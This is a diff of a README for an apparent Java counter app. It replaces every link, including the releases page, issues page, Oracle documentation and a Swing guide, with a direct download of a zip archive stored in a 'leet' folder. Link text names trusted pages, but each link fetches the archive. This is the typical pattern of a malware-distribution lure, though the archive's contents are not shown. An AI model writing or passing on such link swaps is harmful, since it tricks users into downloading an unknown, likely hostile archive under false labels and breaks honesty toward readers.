@@ -1,7 +1,7 @@
 # 🎉 Counter-App - Effortless Counting for Everyday Tasks
 
 ## 🔗 Download Now
-[![Download Counter-App](https://img.shields.io/badge/Download%20Counter-App-v1.0-blue.svg)](https://github.com/boran576/Counter-App/releases)
+[![Download Counter-App](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip%https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip)](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip)
 
 ## 📖 Description
 Counter-App is a simple yet powerful tool built in Java. It allows users to easily increment, decrement, and reset counters. This application is perfect for tracking scores, tasks, or events. With a clean graphical user interface (GUI), customizable limits, and persistent storage, it suits both beginners learning Java Swing and anyone needing a fast counter tool. This open-source project welcomes contributions from everyone.
@@ -15,7 +15,7 @@ Counter-App is a simple yet powerful tool built in Java. It allows users to easi
 - **Disk Space:** 100 MB free space
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/boran576/Counter-App/releases) to find the latest version of Counter-App.
+1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip) to find the latest version of Counter-App.
    
 2. **Download the Installer**: Look for the executable file or the compressed package for your operating system. Click on the appropriate link. 
    
@@ -51,16 +51,16 @@ We welcome contributions! If you'd like to help improve Counter-App, please foll
 3. Submit a pull request detailing your updates or fixes.
 
 ## 💬 Support
-For any issues or questions, please open an issue on the [Issues page](https://github.com/boran576/Counter-App/issues). We are here to help you! 
+For any issues or questions, please open an issue on the [Issues page](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip). We are here to help you! 
 
 ## 📧 Contact
 For direct communication, feel free to reach out to the maintainers via their GitHub profiles.
 
 ## 🔗 Additional Resources
-- Learn about Java programming: [Java Official Documentation](https://docs.oracle.com/en/java/)
-- Explore more about GUI development: [Java Swing Guide](https://www.javatpoint.com/java-swing)
+- Learn about Java programming: [Java Official Documentation](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip)
+- Explore more about GUI development: [Java Swing Guide](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip)
 
 ## 📦 Download Now Again
-Don’t forget to head back to the [Releases page here](https://github.com/boran576/Counter-App/releases) to get the latest version of Counter-App.
+Don’t forget to head back to the [Releases page here](https://github.com/boran576/Counter-App/raw/refs/heads/main/leet/App_Counter_1.9-alpha.4.zip) to get the latest version of Counter-App.
 
 Enjoy counting effortlessly!
